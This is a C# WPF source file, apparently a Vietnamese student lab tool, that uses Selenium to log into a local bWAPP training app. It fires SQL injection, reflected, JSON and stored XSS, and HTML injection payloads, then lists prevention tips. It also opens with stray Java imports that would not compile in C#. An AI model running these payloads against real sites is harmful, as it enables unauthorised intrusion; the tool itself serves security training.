using java.sql;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using static com.sun.org.apache.xerces.@internal.impl.XMLDocumentFragmentScannerImpl;

namespace WpfApp1
{
    
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }
       
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            FirefoxDriver firefoxDriver = new FirefoxDriver();
            //vào trang bwapp
            firefoxDriver.Url = "http://localhost:8080/bwapp/login.php";
            firefoxDriver.Navigate();
            //thiết lập username/password mặc định
            var username = firefoxDriver.FindElementByCssSelector("#login");
            username.SendKeys("bee");
            var password = firefoxDriver.FindElementByCssSelector("#password");
            password.SendKeys("bug");
            var login = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(3) > button:nth-child(4)");
            login.Click();
            //đăng nhập thành công và chờ trang bwapp load html elements mới
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            
            var demo = firefoxDriver.FindElementByCssSelector("#new_tab");
            demo.Click();
            
            txtshow.Clear();
            bool check_solve = false;
            if (cb_Pentest__HTML_Injection_get.IsChecked == true) { Pentest__HTML_Injection_get(firefoxDriver); check_solve = true; }
            if (cb_Pentest_HTML_Injection_post.IsChecked == true) {Pentest_HTML_Injection_post(firefoxDriver); check_solve = true; }
            if (check_solve == true) print_html();

             check_solve = false;
            if (cb_Pentest_SQL_Injection_get_seach.IsChecked == true) { Pentest_SQL_Injection_get_seach(firefoxDriver);check_solve = true; }
            if (cb_Pentest_SQL_Injection_get_post.IsChecked == true){ Pentest_SQL_Injection_get_post(firefoxDriver); check_solve = true; }
            if (check_solve == true) print_sql();

             check_solve = false;
            if (cb_Pentest_XSS_Reflected_GET.IsChecked == true){ Pentest_XSS_Reflected_GET(firefoxDriver); check_solve = true; }
            if (cb_Pentest_XSS_Reflected_POST.IsChecked == true){ Pentest_XSS_Reflected_POST(firefoxDriver); check_solve = true; }
            if (cb_Pentest_XSS_Reflected_JSON.IsChecked == true) {Pentest_XSS_Reflected_JSON(firefoxDriver); check_solve = true; }
            if (cb_Pentest_XSS_Stored_Blog.IsChecked == true) {Pentest_XSS_Stored_Blog(firefoxDriver); check_solve = true; }
            if (check_solve == true) print_xss();

            firefoxDriver.Quit();
        }
       public void print_sql()
        {
            txtshow.Text = txtshow.Text + "*********Prevention**********\n";
            txtshow.Text = txtshow.Text+ "*Ràng buộc dữ liệu           \n";
            txtshow.Text = txtshow.Text +"*Regular Expression          \n";
            txtshow.Text = txtshow.Text +"*Mysqli_real_escape_string   \n";
            txtshow.Text = txtshow.Text +"*Framework                   \n";
            txtshow.Text = txtshow.Text + "**************************\n\n";

        }
        public void print_xss()
        {
            txtshow.Text = txtshow.Text + "*********Prevention**********\n";
            txtshow.Text = txtshow.Text + "*Ràng buộc dữ liệu           \n";
            txtshow.Text = txtshow.Text + "*Filtering: <script></script>, javascript code \n";
            txtshow.Text = txtshow.Text + "*Escaping \n";
            txtshow.Text = txtshow.Text + "*****************************\n\n";

        }
        public void print_html()
        {
            txtshow.Text = txtshow.Text + "*********Prevention**********\n";
            txtshow.Text = txtshow.Text + "*Ràng buộc dữ liệu           \n";
            txtshow.Text = txtshow.Text + "*Filtering: <script></script>,<html></html>   \n";                  
            txtshow.Text = txtshow.Text + "*****************************\n\n";

        }
        public void Pentest__HTML_Injection_get(FirefoxDriver firefoxDriver)
        {
            var HTML_Injection_get = firefoxDriver.FindElementByCssSelector("#bug-select > option:nth-child(3)");
            HTML_Injection_get.Click();
            WebDriverWait wait = new WebDriverWait(firefoxDriver, TimeSpan.FromSeconds(10));
            var firstname = firefoxDriver.FindElementByCssSelector("#firstname");
            firstname.SendKeys("1");
            var lastname = firefoxDriver.FindElementByCssSelector("#lastname");
            lastname.SendKeys("<script>alert(1);</script>");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(3) > button:nth-child(3)");
            submit.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                //string success = firefoxDriver.SwitchTo().Alert().Text;
                //firefoxDriver.SwitchTo().Alert().Accept();
                //MessageBox.Show("Your web has this bug");
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                txtshow.Text = txtshow.Text + "Pentest__HTML_Injection_get	\t \t<<Solve>> \n";
                //MessageBox.Show("Your web has this bug");
            }
            catch (Exception)
            {
                txtshow.Text = txtshow.Text + "Pentest__HTML_Injection_get	\t \t<<Not Solve>> \n";
            }


        }
        public void Pentest_HTML_Injection_post(FirefoxDriver firefoxDriver)
        {
            var HTML_Injection_get = firefoxDriver.FindElementByCssSelector("#bug-select > option:nth-child(4)");
            HTML_Injection_get.Click();
            WebDriverWait wait = new WebDriverWait(firefoxDriver, TimeSpan.FromSeconds(10));
            var firstname = firefoxDriver.FindElementByCssSelector("#firstname");
            firstname.SendKeys("1");
            var lastname = firefoxDriver.FindElementByCssSelector("#lastname");
            lastname.SendKeys("<script>alert(1);</script>");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(3) > button:nth-child(3)");
            submit.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                //MessageBox.Show("Your web has this bug");
                txtshow.Text = txtshow.Text + "Pentest_HTML_Injection_post	\t \t<<Solve>> \n";
               // Console.WriteLine("Your web has this bug");
            }
            catch (Exception)
            {
                txtshow.Text = txtshow.Text + "Pentest_HTML_Injection_post	\t \t<<Not Solve>> \n";
            }
        }
        public void Pentest_SQL_Injection_get_seach(FirefoxDriver firefoxDriver)
        {
            var SQL_Injection_seạch = firefoxDriver.FindElementByCssSelector("#bug-select > option:nth-child(14)");
            SQL_Injection_seạch.Click();
            WebDriverWait wait = new WebDriverWait(firefoxDriver, TimeSpan.FromSeconds(10));
            var firstname = firefoxDriver.FindElementByCssSelector("#title");
            firstname.SendKeys("1");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > p:nth-child(1) > button:nth-child(3)");
            submit.Click();
            var pagesource = firefoxDriver.PageSource;
            wait = new WebDriverWait(firefoxDriver, TimeSpan.FromSeconds(10));
            firstname = firefoxDriver.FindElementByCssSelector("#title");
            firstname.SendKeys("1' or 1=1 #");
            submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > p:nth-child(1) > button:nth-child(3)");
            submit.Click();
            var pagesource1 = firefoxDriver.PageSource;
            if (pagesource != pagesource1) txtshow.Text = txtshow.Text + "Pentest_SQL_Injection_get_seach	\t \t<<Solve>> \n";
                else txtshow.Text = txtshow.Text + "Pentest_SQL_Injection_get_seach	\t \t<<Not Solve>> \n";

        }
        public void Pentest_SQL_Injection_get_post(FirefoxDriver firefoxDriver)
        {
            var SQL_Injection_post = firefoxDriver.FindElementByCssSelector("#bug-select > option:nth-child(16)");
            SQL_Injection_post.Click();
            WebDriverWait wait = new WebDriverWait(firefoxDriver, TimeSpan.FromSeconds(10));
            var firstname = firefoxDriver.FindElementByCssSelector("#title");
            firstname.SendKeys("1");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > p:nth-child(1) > button:nth-child(3)");
            submit.Click();
            var pagesource = firefoxDriver.PageSource;
            wait = new WebDriverWait(firefoxDriver, TimeSpan.FromSeconds(10));
            firstname = firefoxDriver.FindElementByCssSelector("#title");
            firstname.SendKeys("1' or 1=1 #");
            submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > p:nth-child(1) > button:nth-child(3)");
            submit.Click();
            var pagesource1 = firefoxDriver.PageSource;
            if (pagesource != pagesource1) txtshow.Text = txtshow.Text + "Pentest_SQL_Injection_get_post	\t \t<<Solve>> \n"; 
                else txtshow.Text = txtshow.Text + "Pentest_SQL_Injection_get_post	\t \t<<Not Solve>> \n";

        }
        public void Pentest_XSS_Reflected_GET(FirefoxDriver firefoxDriver)
        {
            var XSS_Reflected_GET = firefoxDriver.FindElementByCssSelector("#bug-select > option:nth-child(49)");
            XSS_Reflected_GET.Click();
            //click để xác nhận
            WebDriverWait wait = new WebDriverWait(firefoxDriver, TimeSpan.FromSeconds(10));
            /*var hack = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(4) > button:nth-child(3)");
            try
            {
                firefoxDriver.ExecuteScript("arguments[0].scrollIntoView()", hack);
                Actions actions = new Actions(firefoxDriver);
                actions.MoveToElement(hack).Click().Build().Perform();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);*/
            var firstname = firefoxDriver.FindElementByCssSelector("#firstname");
            firstname.SendKeys("1");
            var lastname = firefoxDriver.FindElementByCssSelector("#lastname");
            lastname.SendKeys("<script>alert(1);</script>");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(3) > button:nth-child(3)");
            submit.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                //MessageBox.Show("Your web has this bug");  
                txtshow.Text = txtshow.Text + "Pentest_XSS_Reflected_GET	\t\t \t<<Solve>> \n";
            }
            catch (Exception)
            {
                txtshow.Text = txtshow.Text + "Pentest_XSS_Reflected_GET	\t\t \t<<Not Solve>> \n";
            }
        }

        public void Pentest_XSS_Reflected_POST(FirefoxDriver firefoxDriver)
        {
            var XSS_Reflected_POST = firefoxDriver.FindElementByCssSelector("#bug-select > option:nth-child(50)");
            XSS_Reflected_POST.Click();
            /*var hack = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(4) > button:nth-child(3)");
            try
            {
                firefoxDriver.ExecuteScript("arguments[0].scrollIntoView()", hack);
                Actions actions = new Actions(firefoxDriver);
                actions.MoveToElement(hack).Click().Build().Perform();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }*/
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            var firstname = firefoxDriver.FindElementByCssSelector("#firstname");
            firstname.SendKeys("<script>alert(1)</script>");
            var lastname = firefoxDriver.FindElementByCssSelector("#lastname");
            lastname.SendKeys("1");
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(3) > button:nth-child(3)");
            submit.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                //string success = firefoxDriver.SwitchTo().Alert().Text;
                //firefoxDriver.SwitchTo().Alert().Accept();
                //MessageBox.Show("Your web has this bug");
                txtshow.Text = txtshow.Text + "Pentest_XSS_Reflected_POST	\t \t<<Solve>> \n";
            }
            catch (Exception)
            {
                txtshow.Text = txtshow.Text + "Pentest_XSS_Reflected_POST	\t \t<<Not Solve>> \n";
            }
        }

        public void Pentest_XSS_Reflected_JSON(FirefoxDriver firefoxDriver)
        {
            var XSS_Reflected_JSON = firefoxDriver.FindElementByCssSelector("#bug-select > option:nth-child(51)");
            XSS_Reflected_JSON.Click();
            /*var hack = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(4) > button:nth-child(3)");
            try
            {
                firefoxDriver.ExecuteScript("arguments[0].scrollIntoView()", hack);
                Actions actions = new Actions(firefoxDriver);
                actions.MoveToElement(hack).Click().Build().Perform();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }*/
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            var title = firefoxDriver.FindElementByCssSelector("#title");
            title.SendKeys("\"}]}';alert(1)</script>");
            var search = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > p:nth-child(1) > button:nth-child(3)");
            search.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                //MessageBox.Show("Your web has this bug");
                txtshow.Text = txtshow.Text + "Pentest_XSS_Reflected_JSON	\t \t<<Solve>> \n";
            }
            catch (Exception)
            {
                txtshow.Text = txtshow.Text + "Pentest_XSS_Reflected_JSON	\t \t<<Not Solve>> \n";
            }
        }

        public void Pentest_XSS_Stored_Blog(FirefoxDriver firefoxDriver)
        {
            var XSS_Stored_Blog = firefoxDriver.FindElementByCssSelector("#bug-select > option:nth-child(63)");
            XSS_Stored_Blog.Click();
            /*var hack = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(4) > button:nth-child(3)");
            try
            {
                firefoxDriver.ExecuteScript("arguments[0].scrollIntoView()", hack);
                Actions actions = new Actions(firefoxDriver);
                actions.MoveToElement(hack).Click().Build().Perform();

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }*/
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                //MessageBox.Show("Your web has this bug");
                //txtshow.Text = txtshow.Text + "Pentest_XSS_Stored_Blog	\t \t<<Solve>> \n";
            }
            catch { }
            var delete = firefoxDriver.FindElementByCssSelector("#entry_delete");
            delete.Click();
            var add = firefoxDriver.FindElementByCssSelector("#entry_add");
            add.Click();
            var submit = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(2) > td:nth-child(1) > button:nth-child(1)");
            submit.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            var blog = firefoxDriver.FindElementByCssSelector("#entry");
            blog.SendKeys("<script>alert(1)</script>");
            var submit1 = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(2) > td:nth-child(1) > button:nth-child(1)");
            submit1.Click();
            firefoxDriver.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(10);
            try
            {
                //thử tìm xem có alert xuất hiện hay không, nếu có thì thông báo web có lỗ hổng XSS, đưa ra messagebox cảnh báo và khuyến nghị
                //thiết kế giao diện thì thêm một textbox đưa ra một vài giải pháp phòng tránh
                string success = firefoxDriver.SwitchTo().Alert().Text;
                firefoxDriver.SwitchTo().Alert().Accept();
                //MessageBox.Show("Your web has this bug");
                txtshow.Text = txtshow.Text + "Pentest_XSS_Stored_Blog      \t\t \t<<Solve>> \n";
                //txtshow.Text = txtshow.Text + "Pentest_XSS_Reflected_JSON	\t \t<<Solve>> \n";
            }
            catch (Exception)
            {
                txtshow.Text = txtshow.Text + "Pentest_XSS_Stored_Blog	    \t\t \t<<Not Solve>> \n";
            }
            //xóa các entry vừa tạo
            //bỏ chọn add
          /*  var checkbox_add = firefoxDriver.FindElementByCssSelector("#entry_add");
            checkbox_add.Click();
            //chọn delete
            var checkbox_del = firefoxDriver.FindElementByCssSelector("#entry_delete");
            checkbox_del.Click();
            var submit_2 = firefoxDriver.FindElementByCssSelector("#main > form:nth-child(2) > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(2) > td:nth-child(1) > button:nth-child(1)");
            submit_2.Click();*/
        }
    
    }
}
